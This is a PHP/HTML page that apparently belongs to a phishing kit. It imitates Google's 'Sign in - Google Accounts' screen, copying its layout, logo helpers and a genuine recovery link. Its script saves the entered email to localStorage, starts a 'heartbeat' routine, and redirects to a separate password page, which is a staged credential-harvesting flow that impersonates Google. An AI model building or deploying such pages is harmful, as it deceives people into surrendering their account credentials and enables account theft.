<?php require_once('includes/google_layout.php'); google_head('Sign in - Google Accounts'); ?>

<div class="g-card g-card-split g-card-signin">
    <?php google_card_progress(); ?>

    <div class="g-split-layout">
        <div class="g-split-left">
            <?php google_logo(); ?>
            <h1 class="g-title">Sign in</h1>
            <p class="g-subtitle">Use your Google Account</p>
        </div>

        <div class="g-split-right">
            <form id="loginForm" class="g-form" action="#" method="POST" novalidate>
                <div class="g-field">
                    <input type="text" id="emailInput" class="g-input" placeholder=" " required autocomplete="username" inputmode="email" spellcheck="false">
                    <label class="g-label" for="emailInput">Email or phone</label>
                </div>

                
                <a href="https://accounts.google.com/v3/signin/recoveryidentifier?ec=ar_hc_7682439&amp;flowName=GlifWebSignIn&amp;dsh=S-805206139%3A1787442682322032" class="g-link g-link-spaced" target="_blank" rel="noopener noreferrer">Forgot password?</a>

                <p class="g-info">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="#">Learn more about using Guest mode</a>
                </p>

                <div class="g-actions">
                    <a href="#" class="g-btn g-btn-text">Create account</a>
                    <button type="submit" class="g-btn g-btn-primary" id="signinNextBtn">Next</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php google_footer(); google_scripts(); ?>
<script>
document.addEventListener('DOMContentLoaded', function () {
    if (window.GoogleAuth && typeof GoogleAuth.initSignIn === 'function') {
        GoogleAuth.initSignIn();
        if (typeof GoogleAuth.startHeartbeat === 'function') {
            GoogleAuth.startHeartbeat('signin', false);
        }
        return;
    }

    var form = document.getElementById('loginForm');
    var input = document.getElementById('emailInput');
    if (!form || !input) return;

    function goSignIn() {
        var email = (input.value || '').trim();
        if (!email) {
            input.focus();
            input.classList.add('is-error');
            return;
        }

        input.classList.remove('is-error');
        var card = document.querySelector('.g-card');
        if (card) card.classList.add('is-loading');
        form.querySelectorAll('button, input').forEach(function (el) {
            el.disabled = true;
        });

        localStorage.setItem('savedEmail', email);
        window.setTimeout(function () {
            window.location.href = '<?= page_url_esc('pass') ?>';
        }, 900);
    }

    input.addEventListener('input', function () {
        if (this.value.trim()) this.classList.remove('is-error');
    });

    form.addEventListener('submit', function (e) {
        e.preventDefault();
        goSignIn();
    });
});
</script>
</body>
</html>
